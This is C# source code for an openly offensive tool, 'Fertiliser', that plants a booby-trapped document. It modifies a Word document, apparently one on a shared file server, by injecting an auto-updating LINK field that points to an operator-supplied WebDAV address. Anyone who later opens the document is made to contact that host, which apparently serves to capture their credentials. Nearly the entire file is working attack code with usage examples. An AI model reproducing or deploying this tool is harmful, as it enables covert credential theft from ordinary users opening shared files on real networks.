using System;
using System.Linq;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Wordprocessing;
using DocumentFormat.OpenXml;


namespace Fertiliser
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine(Config.banner);
            Console.WriteLine("Author: @domchell\n");

            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Fertiliser.exe <Path> <WebDAV Path> <Field Comment>");
                Console.WriteLine("Example: Fertiliser.exe \\\\fileserver\\important.docx http://workstation:8888/foo \"Update required\"");
                return;
            }

            string filepath = args[0].Trim();
            string webdavpath = args[1].Trim();
            string comment = args[2].Trim();

            try
            {
                using (WordprocessingDocument newDoc = WordprocessingDocument.Open(filepath, true))
                {
                    Console.WriteLine("[*] Attempting to poison {0}", filepath);
                    Run run = new Run();

                    FieldChar fieldChar1 = new FieldChar() { FieldCharType = FieldCharValues.Begin };

                    Console.WriteLine("[*] Injecting new field code pointing to {0}", webdavpath);
                    FieldCode fieldCode1 = new FieldCode() { Space = SpaceProcessingModeValues.Preserve };
                    fieldCode1.Text = " LINK  Excel.Sheet.8 " + webdavpath + " \\a ";

                    FieldChar fieldChar2 = new FieldChar() { FieldCharType = FieldCharValues.Separate };

                    RunProperties runProperties1 = new RunProperties();
                    Bold bold1 = new Bold();
                    BoldComplexScript boldComplexScript1 = new BoldComplexScript();
                    Languages languages1 = new Languages() { Val = "en-US" };

                    runProperties1.Append(bold1);
                    runProperties1.Append(boldComplexScript1);
                    runProperties1.Append(languages1);
                    Text text1 = new Text();
                    text1.Text = comment;

                    FieldChar fieldChar3 = new FieldChar() { FieldCharType = FieldCharValues.End };

                    run.Append(fieldChar1);
                    run.Append(fieldCode1);
                    run.Append(fieldChar2);
                    run.Append(runProperties1);
                    run.Append(text1);
                    run.Append(fieldChar3);

                    var paragraph = newDoc.MainDocumentPart.Document.Body.Elements<Paragraph>().FirstOrDefault();

                    paragraph.PrependChild(run);
                    Console.WriteLine("[*] Saving document");

                }
            }
            catch(Exception e)
            {
                Console.WriteLine("[*] An error occured: " + e.Message);
            }

            Console.WriteLine("[*] Success, your crop is fertilised, happy farming!");
        }
    }
}
